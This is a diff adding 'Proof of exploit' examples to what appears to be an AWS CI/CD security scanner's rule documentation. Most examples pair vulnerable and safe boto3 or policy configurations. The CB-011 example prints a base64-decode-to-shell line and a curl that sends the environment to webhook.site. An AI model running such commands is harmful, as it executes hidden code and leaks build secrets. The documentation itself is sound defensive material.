@@ -3454,6 +3454,42 @@ steps:
 
 **Recommendation.** Disable privileged mode unless the project explicitly requires Docker-in-Docker builds. If required, ensure the buildspec is tightly controlled, peer-reviewed, and sourced from a trusted repository with branch protection.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``privilegedMode: true`` on a CodeBuild
+# project gives the build container privileged Docker
+# access on the build host. A poisoned buildspec or a
+# malicious dependency at build time gets root on the
+# host kernel; CodeBuild hosts are shared so this can
+# reach other tenants' caches.
+import boto3
+cb = boto3.client('codebuild')
+cb.create_project(
+    name='my-build',
+    environment={
+        'type': 'LINUX_CONTAINER',
+        'image': 'aws/codebuild/standard:7.0',
+        'computeType': 'BUILD_GENERAL1_SMALL',
+        'privilegedMode': True,
+    },
+    # ... source / serviceRole etc.
+)
+
+# Safe: ``privilegedMode: False`` (the default). If the
+# build needs to build images, use Kaniko inside the
+# container (no host-runtime access required).
+cb.update_project(
+    name='my-build',
+    environment={
+        'type': 'LINUX_CONTAINER',
+        'image': 'aws/codebuild/standard:7.0',
+        'computeType': 'BUILD_GENERAL1_SMALL',
+        'privilegedMode': False,
+    },
+)
+```
+
 **Source:** [`CB-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CB-004`: No build timeout configured <span class="pg-sev pg-sev--low">LOW</span> { #detail-cb-004 }
@@ -3488,6 +3524,39 @@ steps:
 
 **Recommendation.** Switch to an AWS CodeConnections (CodeStar) connection and reference it from the source configuration. Delete any stored source credentials of type OAUTH, PERSONAL_ACCESS_TOKEN, or BASIC_AUTH via delete_source_credentials.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: CodeBuild source auth uses a stored
+# long-lived token (``OAUTH`` / ``PERSONAL_ACCESS_TOKEN``
+# / ``BASIC_AUTH``). The credential lives on the account
+# indefinitely, never rotates, and isn't revocable from
+# the AWS side. Leak = persistent SCM access.
+import boto3
+cb = boto3.client('codebuild')
+cb.import_source_credentials(
+    authType='PERSONAL_ACCESS_TOKEN',
+    serverType='GITHUB',
+    token='ghp_long_lived_pat_abc123...'   # never expires
+)
+
+# Safe: use a CodeConnections (formerly CodeStar
+# Connections) ARN as the source. The GitHub user can
+# revoke the connection without AWS-side coordination;
+# AWS refreshes the underlying token automatically.
+cb.update_project(
+    name='my-build',
+    source={
+        'type': 'GITHUB',
+        'location': 'https://github.com/myorg/myrepo.git',
+        'auth': {
+            'type': 'CODECONNECTIONS',
+            'resource': 'arn:aws:codeconnections:us-east-1:123:connection/abc-...'
+        }
+    }
+)
+```
+
 **Source:** [`CB-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CB-007`: CodeBuild webhook has no filter group <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-007 }
@@ -3507,6 +3576,37 @@ steps:
 **How this is detected.** An inline buildspec (source.buildspec set to YAML text, or a S3 URL) bypasses the protections that cover your source code. A user with ``codebuild:UpdateProject`` can rewrite the build commands without touching the repository, no PR review, no branch protection, no audit of what changed. Store buildspec.yml in the repo instead.
 
 **Recommendation.** Remove the inline buildspec and store buildspec.yml in the source repository under branch protection. Anyone with codebuild:UpdateProject can silently rewrite an inline buildspec; repository-sourced buildspecs inherit the repo's review and protection controls.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``buildspec`` is inline JSON on the
+# project, not sourced from a protected repo. Anyone
+# with ``codebuild:UpdateProject`` (or who can call the
+# console UI) can rewrite the build steps without a
+# code-review trail. CodeBuild then runs the rewritten
+# spec with the project's role.
+import boto3, json
+cb = boto3.client('codebuild')
+cb.update_project(
+    name='my-build',
+    source={'type': 'NO_SOURCE',
+            'buildspec': json.dumps({'phases': {'build': {'commands': ['malicious']}}})}
+)
+
+# Safe: source ``buildspec.yml`` from a protected repo
+# branch. Changes to the build then route through PR
+# review on the SCM side, and the AWS-side ``UpdateProject``
+# call no longer carries the build's logic.
+cb.update_project(
+    name='my-build',
+    source={
+        'type': 'GITHUB',
+        'location': 'https://github.com/myorg/myrepo.git',
+        'buildspec': 'ci/buildspec.yml'   # path in the repo
+    }
+)
+```
 
 **Source:** [`CB-008`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -3528,6 +3628,38 @@ steps:
 
 **Recommendation.** Add an ``ACTOR_ACCOUNT_ID`` filter pattern to every webhook filter group that accepts ``PULL_REQUEST_CREATED`` / ``PULL_REQUEST_UPDATED`` / ``PULL_REQUEST_REOPENED``, or remove those PR event types. Without actor filtering, any fork can trigger a build that runs with the project's service role.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: the CodeBuild webhook filter accepts
+# ``PULL_REQUEST_CREATED`` / ``PULL_REQUEST_UPDATED``
+# events from any actor. A fork PR triggers the build
+# with the project's full role attached — including
+# any production secrets the role can read.
+import boto3
+cb = boto3.client('codebuild')
+cb.create_webhook(
+    projectName='my-build',
+    filterGroups=[[
+        {'type': 'EVENT', 'pattern': 'PULL_REQUEST_CREATED'},
+        # no ACTOR_ACCOUNT_ID filter
+    ]]
+)
+
+# Safe: add an ``ACTOR_ACCOUNT_ID`` filter that allow-
+# lists only internal accounts (and / or a
+# ``FILE_PATH`` filter that excludes paths an attacker
+# can modify in a fork PR).
+cb.update_webhook(
+    projectName='my-build',
+    filterGroups=[[
+        {'type': 'EVENT', 'pattern': 'PULL_REQUEST_CREATED'},
+        {'type': 'ACTOR_ACCOUNT_ID',
+         'pattern': '12345678|23456789|34567890'}
+    ]]
+)
+```
+
 **Source:** [`CB-010`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CB-011`: CodeBuild buildspec contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-cb-011 }
@@ -3542,6 +3674,33 @@ steps:
 
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the project's buildspec carries indicators
+# of malicious activity — base64-decoded execution, exfil
+# to webhook.site, miner binaries. Either the buildspec
+# was poisoned via UpdateProject (CB-008) or pulled from
+# a compromised repo.
+# (current buildspec source)
+phases:
+  build:
+    commands:
+      - echo Z2g6Li4uIA== | base64 -d | sh
+      - curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the buildspec does only what the build needs.
+# If a check fires here, treat as incident response:
+# rotate the project's role's credentials, audit recent
+# builds, identify the commit / UpdateProject call that
+# introduced the payload.
+phases:
+  build:
+    commands:
+      - make build
+      - aws s3 cp build/ s3://artifacts-bucket/ --recursive
+```
 
 **Source:** [`CB-011`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -4360,6 +4519,50 @@ Resources:
 
 **Recommendation.** Add a Manual approval action to a stage that precedes every Deploy stage that targets a production or sensitive environment.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a CodePipeline that goes Source -> Build
+# -> Deploy with no manual approval stage in between.
+# Every commit on the source branch reaches production
+# automatically. A compromised source branch (force
+# push, malicious co-maintainer, leaked CodeCommit
+# credential) ships straight to prod.
+import boto3
+cp = boto3.client('codepipeline')
+cp.create_pipeline(
+    pipeline={
+        'name': 'release',
+        'stages': [
+            {'name': 'Source', 'actions': [{'actionTypeId': {'category': 'Source', ...}}]},
+            {'name': 'Build', 'actions': [{'actionTypeId': {'category': 'Build', ...}}]},
+            {'name': 'Deploy', 'actions': [{'actionTypeId': {'category': 'Deploy', ...}}]},
+        ],
+        # ...
+    }
+)
+
+# Safe: add a manual approval stage before Deploy. A
+# human reviewer approves each release; an SNS topic
+# can notify the approval group when a release is
+# awaiting decision.
+cp.update_pipeline(
+    pipeline={
+        'name': 'release',
+        'stages': [
+            {'name': 'Source', 'actions': [...]},
+            {'name': 'Build', 'actions': [...]},
+            {'name': 'Approve', 'actions': [{
+                'name': 'manual-approval',
+                'actionTypeId': {'category': 'Approval',
+                                 'owner': 'AWS',
+                                 'provider': 'Manual', 'version': '1'}}]},
+            {'name': 'Deploy', 'actions': [...]},
+        ],
+    }
+)
+```
+
 **Source:** [`CP-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CP-002`: Artifact store not encrypted with customer-managed KMS key <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cp-002 }
@@ -4380,6 +4583,49 @@ Resources:
 
 **Recommendation.** Migrate to owner=AWS, provider=CodeStarSourceConnection and reference a CodeConnections connection ARN.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a CodePipeline source action of type
+# ``ThirdParty`` / ``GitHub`` (v1). This is the legacy
+# integration that stores a long-lived OAuth token on
+# the action configuration. The token has whatever
+# scope the granting GitHub user had, never rotates,
+# and isn't directly revocable from the AWS side.
+import boto3
+cp = boto3.client('codepipeline')
+# Action shape (from get_pipeline):
+{
+    'actionTypeId': {
+        'category': 'Source',
+        'owner': 'ThirdParty',
+        'provider': 'GitHub',
+        'version': '1',
+    },
+    'configuration': {'OAuthToken': 'ghp_long_lived...'}
+}
+
+# Safe: migrate to ``owner: AWS`` with the
+# ``CodeStarSourceConnection`` provider. The action
+# references a CodeConnections (formerly CodeStar) ARN;
+# the GitHub user can revoke the connection, AWS
+# refreshes the underlying token, and the action
+# configuration no longer carries a long-lived secret.
+{
+    'actionTypeId': {
+        'category': 'Source',
+        'owner': 'AWS',
+        'provider': 'CodeStarSourceConnection',
+        'version': '1',
+    },
+    'configuration': {
+        'ConnectionArn': 'arn:aws:codestar-connections:us-east-1:123:connection/...',
+        'FullRepositoryId': 'myorg/myrepo',
+        'BranchName': 'main',
+    },
+}
+```
+
 **Source:** [`CP-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CP-005`: Production Deploy stage has no preceding ManualApproval <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cp-005 }
@@ -4399,6 +4645,38 @@ Resources:
 **How this is detected.** V2 pipelines added native PR triggers; without a ``branches.includes`` filter, any PR, including fork PRs from outside the org, fires the pipeline. The build stage runs with whatever IAM authority the pipeline's role carries, which is the full attack surface a fork-PR compromise can reach.
 
 **Recommendation.** On V2 pipelines, add an ``includes`` filter under the trigger's ``branches`` block (and optionally ``pullRequest.events``) so only PRs targeting specific branches run. Without a filter, any fork-PR can execute the pipeline's build and deploy stages.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a CodePipeline v2 PR trigger with no
+# branch filter accepts pull requests from every
+# branch. A fork-PR (or any branch a non-trusted
+# contributor can push to) triggers a build with the
+# pipeline's full role and access to production
+# artifacts.
+# triggers section of a pipeline definition:
+triggers:
+  - providerType: CodeStarSourceConnection
+    gitConfiguration:
+      sourceActionName: SourceAction
+      pullRequest:
+        - events: [OPEN, UPDATED]
+          # no branches filter
+
+# Safe: filter PR triggers to a specific branch (the
+# release / hotfix branch) so only PRs targeting that
+# branch fire the build. Fork PRs targeting feature
+# branches no longer trigger.
+triggers:
+  - providerType: CodeStarSourceConnection
+    gitConfiguration:
+      sourceActionName: SourceAction
+      pullRequest:
+        - events: [OPEN, UPDATED]
+          branches:
+            includes: [main, release/*]
+```
 
 **Source:** [`CP-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -5633,6 +5911,31 @@ steps:
 
 **Recommendation.** Set imageTagMutability=IMMUTABLE on the repository. Reference images by digest (sha256:...) in deployment manifests for strongest immutability guarantees.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ECR repo with ``imageTagMutability:
+# MUTABLE``. Anyone with ``ecr:PutImage`` (build role,
+# CI/CD credential, leaked token) can push a different
+# image under the same tag, silently swapping what
+# downstream consumers pull next.
+import boto3
+ecr = boto3.client('ecr')
+ecr.create_repository(
+    repositoryName='myapp',
+    imageTagMutability='MUTABLE',
+)
+
+# Safe: ``IMMUTABLE``. Tags can only be pushed once;
+# re-pushing the same tag fails. Updates ship as a new
+# version tag (and the digest never collides), forcing
+# downstream consumers to explicitly bump.
+ecr.put_image_tag_mutability(
+    repositoryName='myapp',
+    imageTagMutability='IMMUTABLE',
+)
+```
+
 **Source:** [`ECR-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `ECR-005`: Repository encrypted with AES256 rather than KMS CMK <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ecr-005 }
@@ -5652,6 +5955,35 @@ steps:
 **How this is detected.** AWS supports pull-through cache for ECR Public, Quay, K8s, GitHub Container Registry, GitLab, and Docker Hub. A rule pointing at ``registry-1.docker.io`` without an authenticated credential silently caches whatever the public namespace resolves to.
 
 **Recommendation.** Scope pull-through cache rules to AWS-trusted registries (ECR Public, Quay.io with authentication, or a vetted private registry). Avoid wildcard or unauthenticated upstreams, a malicious image there gets cached into your account registry on first pull.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: an ECR pull-through cache rule with an
+# untrusted upstream registry. Untrusted = anything
+# other than AWS / k8s.io / Docker Hub Verified
+# Publishers. A pull-through cache means ECR fetches
+# from the upstream on first reference and caches the
+# bytes; if the upstream is compromised, those bytes
+# land in your registry and ship to every consumer.
+import boto3
+ecr = boto3.client('ecr')
+ecr.create_pull_through_cache_rule(
+    ecrRepositoryPrefix='internal-mirror',
+    upstreamRegistryUrl='https://rando-mirror.example.com',
+)
+
+# Safe: pull-through caches only against well-known
+# upstreams whose publisher controls you trust
+# (Docker Hub Verified, ECR Public, Quay, K8s.io). For
+# anything else, replicate via an org-controlled mirror
+# with content scanning between the upstream and your
+# registry.
+ecr.create_pull_through_cache_rule(
+    ecrRepositoryPrefix='public-cache',
+    upstreamRegistryUrl='https://public.ecr.aws',
+)
+```
 
 **Source:** [`ECR-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -9959,6 +10291,42 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 **Recommendation.** Add a Condition requiring sts:ExternalId for external principals.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a role with a cross-account trust policy
+# missing ``sts:ExternalId`` in its Condition. The
+# Confused Deputy problem: a third-party SaaS (or
+# another team in another org) that AWS uses your
+# ARN with can be tricked into using it on the wrong
+# customer's behalf.
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": {"AWS": "arn:aws:iam::999999999999:root"},
+    "Action": "sts:AssumeRole"
+  }]
+}
+
+# Safe: require ``sts:ExternalId`` matching a value
+# the third party shares only with your tenant. Even
+# if the third-party SaaS is tricked into assuming
+# your role on a different customer's behalf, the
+# AssumeRole fails without the matching ExternalId.
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": {"AWS": "arn:aws:iam::999999999999:root"},
+    "Action": "sts:AssumeRole",
+    "Condition": {
+      "StringEquals": {"sts:ExternalId": "e7c1a0b3-abc-tenant-id"}
+    }
+  }]
+}
+```
+
 **Source:** [`IAM-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `IAM-006`: Sensitive actions granted with wildcard Resource <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-iam-006 }
@@ -9979,6 +10347,36 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 **Recommendation.** Rotate or delete IAM access keys older than 90 days. Long-lived static credentials are the #1 way compromised CI credentials get reused across environments, prefer short-lived STS tokens via OIDC federation or an assumed role.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: an IAM user has an active access key older
+# than 90 days. Long-lived keys accumulate exposure: any
+# leak (laptop theft, .aws/credentials gitignore miss,
+# accidental commit, log echo) yields a key still valid
+# years later. AWS best practice is 90-day rotation.
+import boto3, datetime
+iam = boto3.client('iam')
+keys = iam.list_access_keys(UserName='ci-bot')['AccessKeyMetadata']
+for k in keys:
+    age = (datetime.datetime.now(datetime.UTC) - k['CreateDate']).days
+    print(k['AccessKeyId'], age, 'days')   # 412 days, still Active
+
+# Safe: rotate on a schedule. The strongest fix is to
+# eliminate IAM users entirely for service identities
+# (federate via OIDC / IAM Roles Anywhere / instance
+# profiles). For human users, enforce rotation via
+# IAM SCP and an automation that deactivates keys
+# older than 90 days.
+iam.update_access_key(
+    UserName='ci-bot', AccessKeyId='AKIA...OLD',
+    Status='Inactive'
+)
+iam.delete_access_key(
+    UserName='ci-bot', AccessKeyId='AKIA...OLD'
+)
+```
+
 **Source:** [`IAM-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `IAM-008`: OIDC-federated role trust policy missing audience or subject pin <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-008 }
@@ -9988,6 +10386,46 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 **How this is detected.** IAM-005 already covers cross-account AWS principals. This rule targets the OIDC federation path specifically because the blast radius of a missed audience/subject pin is the entire identity provider's tenant base (e.g. all GitHub users, not just your org).
 
 **Recommendation.** Every Allow statement that trusts a federated OIDC provider (``token.actions.githubusercontent.com``, GitLab, CircleCI, Terraform Cloud, etc.) must pin both the audience (``...:aud = sts.amazonaws.com``) and a subject prefix (``...:sub`` matching ``repo:myorg/*``). Without these, any workflow from any tenant can assume the role.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: an OIDC-federated IAM role's trust policy
+# is missing either the audience (``:aud``) check or
+# the subject (``:sub``) pin. Any OIDC token from the
+# named provider — even one minted for a different
+# audience or a different repo / branch — can assume
+# the role.
+{
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": {"Federated":
+      "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
+    "Action": "sts:AssumeRoleWithWebIdentity"
+    // no Condition
+  }]
+}
+
+# Safe: pin BOTH ``:aud`` (the audience the token was
+# minted for, typically ``sts.amazonaws.com``) AND
+# ``:sub`` (the specific repo + branch / environment).
+# Reject any token whose claims don't match.
+{
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": {"Federated":
+      "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
+    "Action": "sts:AssumeRoleWithWebIdentity",
+    "Condition": {
+      "StringEquals": {
+        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
+        "token.actions.githubusercontent.com:sub":
+          "repo:myorg/myrepo:environment:production"
+      }
+    }
+  }]
+}
+```
 
 **Source:** [`IAM-008`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -11089,6 +11527,39 @@ pipeline {
 
 **Recommendation.** Create an AWS Signer profile, reference it from an ``aws_lambda_code_signing_config`` with ``untrusted_artifact_on_deployment = Enforce`` and attach that config to the function. Without one, the Lambda runtime will execute any code that a principal with lambda:UpdateFunctionCode uploads.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a Lambda function with no CodeSigningConfig
+# attached. Anyone with ``lambda:UpdateFunctionCode`` can
+# push arbitrary code without signature verification; a
+# compromised deploy role ships malicious code into
+# production with no signing gate.
+import boto3
+lambdacli = boto3.client('lambda')
+lambdacli.get_function(FunctionName='process-payment')[
+    'Configuration'
+].get('CodeSigningConfigArn')  # -> None
+
+# Safe: create a Signing Profile + CodeSigningConfig
+# and attach it. Only signed code packages (signed via
+# AWS Signer) can be deployed; unsigned uploads are
+# rejected by Lambda.
+signer = boto3.client('signer')
+prof = signer.put_signing_profile(
+    profileName='prod-lambda-signer',
+    platformId='AWSLambda-SHA384-ECDSA',
+)
+csc = lambdacli.create_code_signing_config(
+    AllowedPublishers={'SigningProfileVersionArns': [prof['profileVersionArn']]},
+    CodeSigningPolicies={'UntrustedArtifactOnDeployment': 'Enforce'},
+)
+lambdacli.update_function_configuration(
+    FunctionName='process-payment',
+    CodeSigningConfigArn=csc['CodeSigningConfig']['CodeSigningConfigArn'],
+)
+```
+
 **Source:** [`LMB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `MVN-001`: pom.xml dependency uses a floating version range <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-mvn-001 }
@@ -11961,6 +12432,38 @@ Detection scope: the config descriptor digest, every layer descriptor digest (si
 
 **Recommendation.** Configure the CodeBuild project to run inside a VPC with appropriate subnets and security groups. Use a NAT gateway or VPC endpoints to control outbound internet access and restrict build nodes to only the network resources they require.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a CodeBuild project with no VPC config.
+# The build container runs in AWS's shared VPC with
+# unrestricted outbound internet — exactly the egress
+# path a compromised build uses to exfiltrate secrets
+# or pull a second-stage payload. No VPC flow logs to
+# correlate either.
+import boto3
+cb = boto3.client('codebuild')
+cb.create_project(
+    name='my-build',
+    # no vpcConfig — runs in AWS's shared VPC
+    environment={...},
+    source={...},
+)
+
+# Safe: attach the project to an org-controlled VPC.
+# Egress goes through a NAT + VPC endpoints + (optional)
+# egress firewall; VPC flow logs capture every outbound
+# packet for incident response.
+cb.update_project(
+    name='my-build',
+    vpcConfig={
+        'vpcId': 'vpc-abc123',
+        'subnets': ['subnet-private-1', 'subnet-private-2'],
+        'securityGroupIds': ['sg-codebuild-egress'],
+    },
+)
+```
+
 **Source:** [`PBAC-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `PBAC-002`: CodeBuild service role shared across multiple projects <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-pbac-002 }
@@ -11980,6 +12483,51 @@ Detection scope: the config descriptor digest, every layer descriptor digest (si
 **How this is detected.** When stage actions don't set their own ``roleArn``, they fall back to the pipeline-level role, which is the union of every stage's needs. A compromise of any one stage (typically the build, which runs untrusted code) gains the deploy stage's authority, including production deploy credentials. Per-action roles cap the radius.
 
 **Recommendation.** Give each stage action (Source, Build, Deploy) its own narrowly-scoped IAM role via ``roleArn`` on the action declaration. Sharing the pipeline-level role means a compromise of one action (e.g. a build) gains the permissions the deploy stage also needs.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: every stage in the pipeline references
+# the pipeline's top-level role. A bad release lands
+# in the Source stage with the same authority as the
+# Deploy stage — the Source action can write S3
+# objects the Deploy role can, fetch Secrets Manager
+# values it shouldn't, etc.
+pipeline = {
+    'roleArn': 'arn:aws:iam::123:role/pipeline-master',
+    'stages': [
+        {'name': 'Source', 'actions': [
+            {'roleArn': 'arn:aws:iam::123:role/pipeline-master'}
+        ]},
+        {'name': 'Build', 'actions': [
+            {'roleArn': 'arn:aws:iam::123:role/pipeline-master'}
+        ]},
+        {'name': 'Deploy', 'actions': [
+            {'roleArn': 'arn:aws:iam::123:role/pipeline-master'}
+        ]},
+    ],
+}
+
+# Safe: each stage / action carries its own
+# narrowly-scoped role. Source has Read on the source
+# bucket only; Build can write CodeBuild logs; Deploy
+# has CodeDeploy / CloudFormation rights but no
+# Source-bucket write.
+pipeline = {
+    'roleArn': 'arn:aws:iam::123:role/pipeline-orchestrator',
+    'stages': [
+        {'name': 'Source', 'actions': [
+            {'roleArn': 'arn:aws:iam::123:role/pipeline-source'}
+        ]},
+        {'name': 'Build', 'actions': [
+            {'roleArn': 'arn:aws:iam::123:role/pipeline-build'}
+        ]},
+        {'name': 'Deploy', 'actions': [
+            {'roleArn': 'arn:aws:iam::123:role/pipeline-deploy'}
+        ]},
+    ],
+}
+```
 
 **Source:** [`PBAC-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -12542,6 +13090,39 @@ If your org doesn't license GHAS (the underlying feature), this rule type isn't 
 **How this is detected.** A revoked or canceled Signer profile invalidates every signature it ever produced. Lambda functions configured to enforce code-signing fail to deploy until the profile is replaced (or, if ``UntrustedArtifactOnDeployment = Warn``, deploy with a CloudWatch warning the operator rarely reads).
 
 **Recommendation.** Rotate the signing profile: create a replacement and update every code-signing config that references the revoked profile. A revoked or canceled profile invalidates every signature it produced, lambdas relying on it will fail verification.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: AWS Signer profile is revoked or
+# inactive. Code-signing pipelines that route through
+# this profile silently fail (or fall back to
+# unsigned artifacts if the gate is permissive); the
+# unsigned artifacts then deploy without integrity
+# verification.
+import boto3
+signer = boto3.client('signer')
+signer.get_signing_profile(profileName='prod-lambda-signer')
+# {'status': 'Revoked', 'statusReason': 'compromise suspected'}
+
+# Safe: investigate the revocation, rotate to a new
+# profile if compromise is confirmed, or restore the
+# original if revoked in error. Either way, the
+# downstream pipeline reference (CodeSigningConfig on
+# Lambdas) must be updated to point at the active
+# profile so signed deploys resume.
+new_prof = signer.put_signing_profile(
+    profileName='prod-lambda-signer-v2',
+    platformId='AWSLambda-SHA384-ECDSA',
+)
+lambdacli = boto3.client('lambda')
+lambdacli.update_code_signing_config(
+    CodeSigningConfigArn='arn:aws:lambda:us-east-1:123:code-signing-config:csc-...',
+    AllowedPublishers={
+        'SigningProfileVersionArns': [new_prof['profileVersionArn']]
+    },
+)
+```
 
 **Source:** [`SIGN-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
